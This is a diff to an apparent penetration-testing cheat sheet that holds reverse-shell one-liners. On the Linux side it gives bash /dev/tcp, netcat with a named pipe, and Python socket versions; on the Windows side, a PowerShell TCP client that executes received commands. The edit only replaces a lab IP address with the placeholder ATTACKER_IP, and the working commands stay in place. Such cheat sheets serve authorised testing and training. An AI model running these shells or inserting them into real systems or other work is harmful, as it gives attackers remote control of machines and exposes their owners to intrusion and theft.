@@ -31,18 +31,18 @@ rlwrap nc -lvnp 443
 
 ```bash
 # Bash /dev/tcp (no tools needed)
-bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'
+bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'
 # Netcat with a named pipe (when -e is not compiled in)
-rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.10.14.5 443 > /tmp/f
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP 443 > /tmp/f
 # Python
-python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.5",443));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'
 ```
 
 ## Windows target one-liners
 
 ```powershell
 # PowerShell reverse shell (one line; TLS/HTTPS variants exist for egress)
-powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('10.10.14.5',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1 | Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()}"
+powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1 | Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()}"
 ```
 
 ## Notes
